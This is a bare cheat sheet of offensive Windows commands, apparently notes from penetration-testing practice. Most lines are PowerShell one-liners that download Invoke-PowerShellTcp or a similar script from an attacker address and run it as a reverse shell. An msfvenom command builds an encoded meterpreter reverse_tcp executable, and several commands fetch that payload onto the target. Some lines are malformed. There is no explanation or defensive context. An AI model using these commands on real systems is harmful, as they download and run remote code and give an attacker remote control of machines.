
create powershell in windows

 powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port_
 
  powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.249.117:8081/psh.ps1');psh.ps1 -Reverse 10.8.249.117 -Port 4443
  
  
  powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.249.117/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -10.8.249.117  -Port 4443
  
  powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.249.117/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.249.117 -Port 4443
  
  Invoke-PowerShellTcp -Reverse -IPAddress 10.8.249.117 -Port 4443
 
 ## create Payload
 
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.249.117 LPORT=8081 -f exe -o learn.exe
 
 ## call payload
 
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.249.117:8081/learn.exe','learn.exe')"
 
 invoke-webrequest -Uri "http://10.8.249.117:8081/learn.exe"
 

Start-BitsTransfer -Source "http://10.8.249.117:8081/learn.exe" -d "c:\users"


 
 